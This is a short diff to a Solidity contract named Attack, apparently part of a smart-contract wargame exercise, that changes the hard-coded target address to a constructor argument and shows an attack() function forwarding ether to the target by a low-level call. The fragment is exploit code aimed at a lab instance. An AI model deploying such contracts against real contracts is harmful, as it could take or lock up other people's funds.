@@ -4,7 +4,11 @@ pragma solidity ^0.8.0;
 
 contract Attack {
 
-    address payable target = payable("Instance address");
+    address payable target;
+
+    constructor(address targetAddr) {
+        target = payable(targetAddr);
+    }
 
     function attack() payable public {
         (bool success, ) = target.call{value: msg.value}("");
